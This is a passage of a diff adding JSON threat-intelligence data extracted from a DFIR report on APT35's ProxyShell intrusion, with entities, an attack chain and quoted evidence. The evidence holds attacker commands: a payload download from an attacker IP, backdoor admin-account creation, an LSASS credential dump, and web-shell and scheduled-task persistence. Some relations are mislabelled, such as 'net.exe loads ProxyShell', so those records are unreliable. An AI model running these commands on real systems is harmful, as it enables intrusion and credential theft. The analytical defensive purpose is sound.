+        "notes": "report_download_support",
+        "schema_version": "v3.2-report-recovery",
+        "evidence_span": "ev_7"
+      },
+      "head": {
+        "id": "ent_malware_ProxyShell",
+        "type": "Malware",
+        "name": "ProxyShell",
+        "normalized_name": "ProxyShell",
+        "aliases": [],
+        "confidence": 0.86,
+        "evidence_ids": [],
+        "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+        "family": "ProxyShell",
+        "sources": [
+          "title_derive"
+        ],
+        "entity_scope": "core",
+        "core_observation": true
+      },
+      "tail": {
+        "id": "ent_file_dllhost.exe",
+        "type": "File",
+        "name": "dllhost.exe",
+        "normalized_name": "dllhost.exe",
+        "aliases": [],
+        "confidence": 0.94,
+        "evidence_ids": [
+          "ev_55",
+          "ev_66",
+          "ev_75",
+          "ev_91"
+        ],
+        "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+        "file_name": "dllhost.exe",
+        "sources": [
+          "llm",
+          "rule"
+        ],
+        "primary_evidence_id": "ev_66",
+        "supporting_evidence_ids": [
+          "ev_91",
+          "ev_75",
+          "ev_55"
+        ],
+        "needs_review": false,
+        "historical_aliases": [],
+        "related_families": [],
+        "file_role": "file_artifact",
+        "entity_scope": "supporting",
+        "core_observation": false,
+        "observation_kind": "supporting_file_artifact"
+      }
+    },
+    {
+      "id": "rel_0008",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "type": "downloads_payload",
+      "head_id": "ent_malware_ProxyShell",
+      "tail_id": "ent_file_dllhost.exe",
+      "head_type": "Malware",
+      "tail_type": "File",
+      "confidence": 0.89,
+      "evidence_ids": [
+        "ev_7",
+        "ev_66"
+      ],
+      "primary_evidence_id": "ev_7",
+      "direction": "head_to_tail",
+      "extraction_method": "event_refiner",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "downloads_payload",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "delivery",
+        "notes": "payload_download",
+        "schema_version": "v4.0-event-refiner"
+      }
+    },
+    {
+      "id": "rel_0009",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "type": "drops",
+      "head_id": "ent_malware_ProxyShell",
+      "tail_id": "ent_file_dllhost.exe",
+      "head_type": "Malware",
+      "tail_type": "File",
+      "confidence": 0.82,
+      "evidence_ids": [
+        "ev_66"
+      ],
+      "primary_evidence_id": "ev_66",
+      "direction": "head_to_tail",
+      "extraction_method": "rule_sentence",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "drops",
+        "negated": false,
+        "cross_sentence": true,
+        "stage": "delivery",
+        "notes": "report_drop_support",
+        "schema_version": "v3.2-report-recovery",
+        "evidence_span": "ev_66"
+      },
+      "head": {
+        "id": "ent_malware_ProxyShell",
+        "type": "Malware",
+        "name": "ProxyShell",
+        "normalized_name": "ProxyShell",
+        "aliases": [],
+        "confidence": 0.86,
+        "evidence_ids": [],
+        "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+        "family": "ProxyShell",
+        "sources": [
+          "title_derive"
+        ],
+        "entity_scope": "core",
+        "core_observation": true
+      },
+      "tail": {
+        "id": "ent_file_dllhost.exe",
+        "type": "File",
+        "name": "dllhost.exe",
+        "normalized_name": "dllhost.exe",
+        "aliases": [],
+        "confidence": 0.94,
+        "evidence_ids": [
+          "ev_55",
+          "ev_66",
+          "ev_75",
+          "ev_91"
+        ],
+        "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+        "file_name": "dllhost.exe",
+        "sources": [
+          "llm",
+          "rule"
+        ],
+        "primary_evidence_id": "ev_66",
+        "supporting_evidence_ids": [
+          "ev_91",
+          "ev_75",
+          "ev_55"
+        ],
+        "needs_review": false,
+        "historical_aliases": [],
+        "related_families": [],
+        "file_role": "file_artifact",
+        "entity_scope": "supporting",
+        "core_observation": false,
+        "observation_kind": "supporting_file_artifact"
+      }
+    },
+    {
+      "id": "rel_0010",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "type": "executes",
+      "head_id": "ent_file_net.exe",
+      "tail_id": "ent_file_ipconfig.exe",
+      "head_type": "File",
+      "tail_type": "File",
+      "confidence": 0.86,
+      "evidence_ids": [
+        "ev_49"
+      ],
+      "primary_evidence_id": "ev_49",
+      "direction": "head_to_tail",
+      "extraction_method": "event_frame",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "executes",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "execution",
+        "notes": "execute_event",
+        "schema_version": "v5.0-event-frame"
+      }
+    },
+    {
+      "id": "rel_0011",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "type": "executes",
+      "head_id": "ent_file_powershell.exe",
+      "tail_id": "ent_file_dllhost.exe",
+      "head_type": "File",
+      "tail_type": "File",
+      "confidence": 0.86,
+      "evidence_ids": [
+        "ev_73"
+      ],
+      "primary_evidence_id": "ev_73",
+      "direction": "head_to_tail",
+      "extraction_method": "event_frame",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "executes",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "execution",
+        "notes": "execute_event",
+        "schema_version": "v5.0-event-frame"
+      }
+    },
+    {
+      "id": "rel_0012",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "type": "executes",
+      "head_id": "ent_malware_ProxyShell",
+      "tail_id": "ent_file_dllhost.exe",
+      "head_type": "Malware",
+      "tail_type": "File",
+      "confidence": 0.84,
+      "evidence_ids": [
+        "ev_7"
+      ],
+      "primary_evidence_id": "ev_7",
+      "direction": "head_to_tail",
+      "extraction_method": "event_frame",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "executes",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "execution",
+        "notes": "carry_execute",
+        "schema_version": "v5.0-event-frame"
+      }
+    },
+    {
+      "id": "rel_0013",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "type": "loads",
+      "head_id": "ent_file_Wininet.bat",
+      "tail_id": "ent_malware_ProxyShell",
+      "head_type": "File",
+      "tail_type": "Malware",
+      "confidence": 0.83,
+      "evidence_ids": [
+        "ev_30",
+        "ev_74"
+      ],
+      "primary_evidence_id": "ev_30",
+      "direction": "head_to_tail",
+      "extraction_method": "event_refiner",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "loads",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "execution",
+        "notes": "carry_loader_to_payload",
+        "schema_version": "v4.0-event-refiner"
+      }
+    },
+    {
+      "id": "rel_0014",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "type": "loads",
+      "head_id": "ent_file_net.exe",
+      "tail_id": "ent_file_ipconfig.exe",
+      "head_type": "File",
+      "tail_type": "File",
+      "confidence": 0.85,
+      "evidence_ids": [
+        "ev_49"
+      ],
+      "primary_evidence_id": "ev_49",
+      "direction": "head_to_tail",
+      "extraction_method": "event_frame",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "loads",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "execution",
+        "notes": "carry_file_chain",
+        "schema_version": "v5.0-event-frame"
+      }
+    },
+    {
+      "id": "rel_0015",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "type": "loads",
+      "head_id": "ent_file_net.exe",
+      "tail_id": "ent_malware_ProxyShell",
+      "head_type": "File",
+      "tail_type": "Malware",
+      "confidence": 0.83,
+      "evidence_ids": [
+        "ev_49"
+      ],
+      "primary_evidence_id": "ev_49",
+      "direction": "head_to_tail",
+      "extraction_method": "event_refiner",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "loads",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "execution",
+        "notes": "carry_loader_to_payload",
+        "schema_version": "v4.0-event-refiner"
+      }
+    },
+    {
+      "id": "rel_0016",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "type": "loads",
+      "head_id": "ent_file_powershell.exe",
+      "tail_id": "ent_file_dllhost.exe",
+      "head_type": "File",
+      "tail_type": "File",
+      "confidence": 0.85,
+      "evidence_ids": [
+        "ev_73"
+      ],
+      "primary_evidence_id": "ev_73",
+      "direction": "head_to_tail",
+      "extraction_method": "event_frame",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "loads",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "execution",
+        "notes": "carry_file_chain",
+        "schema_version": "v5.0-event-frame"
+      }
+    },
+    {
+      "id": "rel_0017",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "type": "loads",
+      "head_id": "ent_file_user.exe",
+      "tail_id": "ent_malware_ProxyShell",
+      "head_type": "File",
+      "tail_type": "Malware",
+      "confidence": 0.83,
+      "evidence_ids": [
+        "ev_35",
+        "ev_76"
+      ],
+      "primary_evidence_id": "ev_35",
+      "direction": "head_to_tail",
+      "extraction_method": "event_refiner",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "loads",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "execution",
+        "notes": "carry_loader_to_payload",
+        "schema_version": "v4.0-event-refiner"
+      }
+    },
+    {
+      "id": "rel_0018",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "type": "uses_malware",
+      "head_id": "ent_threatactor_APT35",
+      "tail_id": "ent_malware_ProxyShell",
+      "head_type": "ThreatActor",
+      "tail_type": "Malware",
+      "confidence": 0.88,
+      "evidence_ids": [
+        "ev_122",
+        "ev_title"
+      ],
+      "primary_evidence_id": "ev_122",
+      "direction": "head_to_tail",
+      "extraction_method": "event_refiner",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "uses_malware",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "execution",
+        "notes": "sparse_core_use_recovery; use_head",
+        "schema_version": "v4.0-event-refiner",
+        "evidence_span": "APT35 Automates Initial Access Using ProxyShell"
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step_id": "step_001",
+      "stage": "delivery",
+      "relation_id": "rel_0008",
+      "type": "downloads_payload",
+      "summary": "ProxyShell downloads_payload dllhost.exe",
+      "evidence_ids": [
+        "ev_7",
+        "ev_66"
+      ]
+    },
+    {
+      "step_id": "step_002",
+      "stage": "delivery",
+      "relation_id": "rel_0009",
+      "type": "drops",
+      "summary": "ProxyShell drops dllhost.exe",
+      "evidence_ids": [
+        "ev_66"
+      ]
+    },
+    {
+      "step_id": "step_003",
+      "stage": "execution",
+      "relation_id": "rel_0010",
+      "type": "executes",
+      "summary": "net.exe executes ipconfig.exe",
+      "evidence_ids": [
+        "ev_49"
+      ]
+    },
+    {
+      "step_id": "step_004",
+      "stage": "execution",
+      "relation_id": "rel_0011",
+      "type": "executes",
+      "summary": "powershell.exe executes dllhost.exe",
+      "evidence_ids": [
+        "ev_73"
+      ]
+    },
+    {
+      "step_id": "step_005",
+      "stage": "execution",
+      "relation_id": "rel_0012",
+      "type": "executes",
+      "summary": "ProxyShell executes dllhost.exe",
+      "evidence_ids": [
+        "ev_7"
+      ]
+    },
+    {
+      "step_id": "step_006",
+      "stage": "execution",
+      "relation_id": "rel_0013",
+      "type": "loads",
+      "summary": "Wininet.bat loads ProxyShell",
+      "evidence_ids": [
+        "ev_30",
+        "ev_74"
+      ]
+    },
+    {
+      "step_id": "step_007",
+      "stage": "execution",
+      "relation_id": "rel_0014",
+      "type": "loads",
+      "summary": "net.exe loads ipconfig.exe",
+      "evidence_ids": [
+        "ev_49"
+      ]
+    },
+    {
+      "step_id": "step_008",
+      "stage": "execution",
+      "relation_id": "rel_0015",
+      "type": "loads",
+      "summary": "net.exe loads ProxyShell",
+      "evidence_ids": [
+        "ev_49"
+      ]
+    },
+    {
+      "step_id": "step_009",
+      "stage": "execution",
+      "relation_id": "rel_0016",
+      "type": "loads",
+      "summary": "powershell.exe loads dllhost.exe",
+      "evidence_ids": [
+        "ev_73"
+      ]
+    },
+    {
+      "step_id": "step_010",
+      "stage": "execution",
+      "relation_id": "rel_0017",
+      "type": "loads",
+      "summary": "user.exe loads ProxyShell",
+      "evidence_ids": [
+        "ev_35",
+        "ev_76"
+      ]
+    },
+    {
+      "step_id": "step_011",
+      "stage": "execution",
+      "relation_id": "rel_0018",
+      "type": "uses_malware",
+      "summary": "APT35 uses_malware ProxyShell",
+      "evidence_ids": [
+        "ev_122",
+        "ev_title"
+      ]
+    },
+    {
+      "step_id": "step_012",
+      "stage": "command_and_control",
+      "relation_id": "rel_0006",
+      "type": "downloads",
+      "summary": "Wininet.bat downloads dllhost.exe",
+      "evidence_ids": [
+        "ev_74"
+      ]
+    },
+    {
+      "step_id": "step_013",
+      "stage": "command_and_control",
+      "relation_id": "rel_0007",
+      "type": "downloads",
+      "summary": "ProxyShell downloads dllhost.exe",
+      "evidence_ids": [
+        "ev_7",
+        "ev_66"
+      ]
+    }
+  ],
+  "evidences": [
+    {
+      "id": "ev_4",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 1,
+        "section": "body",
+        "sentence_id": "p1_s4"
+      },
+      "text": "We assess that this activity was related to APT35 (TA453, COBALT ILLUSION, Charming Kitten, ITG18, Phosphorus, Newscaster) due to the TTP’s mirroring previously reported activity that was attributed to the group.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_7",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 1,
+        "section": "body",
+        "sentence_id": "p1_s7"
+      },
+      "text": "Like in the prior case involving ProxyShell, we observed a file masquerading as dllhost.exe that exhibited similarities to a proxy tool call Fast Reverse Proxy (with modifications) downloaded from the same IP as observed in the prior case and connecting to suspect domains.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_15",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 2,
+        "section": "body",
+        "sentence_id": "p2_s1"
+      },
+      "text": "Services We offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as Cobalt Strike, BazarLoader, Covenant, Metasploit, Empire, PoshC2, etc.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_22",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 4,
+        "section": "body",
+        "sentence_id": "p4_s6"
+      },
+      "text": "New-MailboxExportRequest -Mailbox \"administrator@<REDACTED>\" -FilePath \"\\\\localhost\\C$\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\ecp\\auth\\aspx_wkggiyvttmu.aspx\" -IncludeFolders (\"#Drafts#\") -ContentFilter \"Subject -eq 'aspx_wkggiyvttmu'\"",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_26",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 5,
+        "section": "body",
+        "sentence_id": "p5_s1"
+      },
+      "text": "Approximately 20 seconds after the web shell aspx_wkggiyvttmu.aspx was created, a flurry of POST requests were sent to the web shell.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_29",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 6,
+        "section": "body",
+        "sentence_id": "p6_s2"
+      },
+      "text": "This was followed shortly by several commands to impair Windows Defender before downloading and executing a fake dllhost.exe from 148.251.71[.]182.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_30",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 7,
+        "section": "body",
+        "sentence_id": "p7_s1"
+      },
+      "text": "The schedule task runs a batch script called Wininet.bat which was also uploaded through the web shell.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_31",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 7,
+        "section": "body",
+        "sentence_id": "p7_s2"
+      },
+      "text": "Wininet.bat simply loops through the execution of the file dllhost.exe .",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_33",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 7,
+        "section": "body",
+        "sentence_id": "p7_s4"
+      },
+      "text": "When executed, the binary was observed resolving the following domains: api.myip[.]com (for discovery) tcp443.msupdate[.]us kcp53.msupdate[.]us",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_35",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 8,
+        "section": "body",
+        "sentence_id": "p8_s2"
+      },
+      "text": "New account creation During the first activity, we observed the use of user.exe executable that ran the following PowerShell command:",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_41",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 11,
+        "section": "body",
+        "sentence_id": "p11_s1"
+      },
+      "text": "Privilege Escalation The scheduled task created by the web shell was set to use the principal SID “S-1-5-18”, or SYSTEM.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_42",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 11,
+        "section": "body",
+        "sentence_id": "p11_s2"
+      },
+      "text": "<UserId>S-1-5-18</UserId> Defense Evasion Using PowerShell the threat actors issued several commands to impair Windows Defender including:",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_45",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 11,
+        "section": "body",
+        "sentence_id": "p11_s5"
+      },
+      "text": "Credential Access The threat actor created a process memory dump from LSASS.exe.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_46",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 11,
+        "section": "body",
+        "sentence_id": "p11_s6"
+      },
+      "text": "In this case they created a “minidump” using the LOLBIN comsvcs.dll.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_49",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 12,
+        "section": "body",
+        "sentence_id": "p12_s2"
+      },
+      "text": "They executed commands such as: net.exe user ipconfig.exe /all powershell.exe (multiple commands) quser.exe",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_55",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 13,
+        "section": "body",
+        "sentence_id": "p13_s1"
+      },
+      "text": "As we saw from the execution section, dllhost.exe was used to access the below domains for C2, which we believe was using a variation of FRP.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_56",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 13,
+        "section": "body",
+        "sentence_id": "p13_s2"
+      },
+      "text": "tcp443.msupdate[.]us (107.173.231[.]114) kcp53.msupdate[.]us (107.173.231[.]114)",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_62",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 14,
+        "section": "body",
+        "sentence_id": "p14_s2"
+      },
+      "text": "File aspx_dyukbdcxjfi.aspx dhvqx.aspx dllhost.exe wininet.bat wininet.xml user.exe task_update.exe Detections",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_66",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 1,
+        "section": "rule",
+        "sentence_id": "p1_r1"
+      },
+      "text": "Soon after, they established two persistence methods. The first was through scheduled tasks, and the second, was via a newly created account. The account was then added to the “remote desktop users” and “local administrators users” groups. Like in the prior case involving ProxyShell, we observed a file masquerading as dllhost.exe that exhibited similarities to a proxy tool call Fast Reverse Proxy (with modifications) downloaded from the same IP as observed in the prior case and connecting to suspect domains.",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_68",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 4,
+        "section": "rule",
+        "sentence_id": "p4_r1"
+      },
+      "text": "CVE-2021-34473 CVE-2021-34523 CVE-2021-31207",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_69",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 4,
+        "section": "rule",
+        "sentence_id": "p4_r2"
+      },
+      "text": "Once the threat actor had gained a valid privileged session using CVE-2021-34473 and CVE- 2021-34523, they then ensured the default Administrator account had the correct role for mailbox importing and exporting:",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_70",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 6,
+        "section": "rule",
+        "sentence_id": "p6_r1"
+      },
+      "text": "dllhost.exe from 148.251.71[.]182.",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_71",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 7,
+        "section": "rule",
+        "sentence_id": "p7_r1"
+      },
+      "text": "schtasks.exe /Create /F /XML C:\\windows\\temp\\Wininet.xml /tn '\\Microsoft\\Windows\\Maintenance\\Wininet'",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_73",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 7,
+        "section": "rule",
+        "sentence_id": "p7_r3"
+      },
+      "text": "Start-Process powershell.exe {$file='c:\\windows\\dllhost.exe'; Invoke-WebRequest -Uri 'hXXp://148.251.71[.]182/update[.]tmp' -OutFile $file}",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_74",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 7,
+        "section": "rule",
+        "sentence_id": "p7_r4"
+      },
+      "text": "The schedule task runs a batch script called Wininet.bat which was also uploaded through the web shell. Wininet.bat simply loops through the execution of the file dllhost.exe .",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_75",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 7,
+        "section": "rule",
+        "sentence_id": "p7_r5"
+      },
+      "text": "The file dllhost.exe is a golang binary. When executed, the binary was observed resolving the following domains:",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_76",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 8,
+        "section": "rule",
+        "sentence_id": "p8_r1"
+      },
+      "text": "During the first activity, we observed the use of user.exe executable that ran the following PowerShell command:",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_77",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 8,
+        "section": "rule",
+        "sentence_id": "p8_r2"
+      },
+      "text": "powershell.exe /c net user /add DefaultAccount P@ssw0rd123412; net user DefaultAccount /active:yes; net user DefaultAccount P@ssw0rd12341234; net localgroup Administrators /add DefaultAccount; net localgroup 'Remote Desktop Users' /add DefaultAccount",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_79",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 10,
+        "section": "rule",
+        "sentence_id": "p10_r1"
+      },
+      "text": "schtasks.exe /Create /F /XML %wintmp%\\Wininet.xml /tn '\\Microsoft\\Windows\\Maintenance\\Wininet'",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_85",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 11,
+        "section": "rule",
+        "sentence_id": "p11_r6"
+      },
+      "text": "The threat actor created a process memory dump from LSASS.exe. In this case they created a “minidump” using the LOLBIN comsvcs.dll. This was dropped to disk as ssasl.pmd (lsass.dmp reversed) and then zipped before exfiltration.",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_86",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 11,
+        "section": "rule",
+        "sentence_id": "p11_r7"
+      },
+      "text": "\"powershell.exe\" /c Remove-Item -Path C:\\windows\\temp\\ssasl.pmd -Force -ErrorAction Ignore; rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id C:\\windows\\temp\\ssasl.pmd full | out-host; Compress-Archive C:\\windows\\temp\\ssasl.pmd C:\\windows\\temp\\ssasl.zip",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_87",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 12,
+        "section": "rule",
+        "sentence_id": "p12_r1"
+      },
+      "text": "net.exe user",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_88",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 12,
+        "section": "rule",
+        "sentence_id": "p12_r2"
+      },
+      "text": "ipconfig.exe /all",
+      "language": "en",
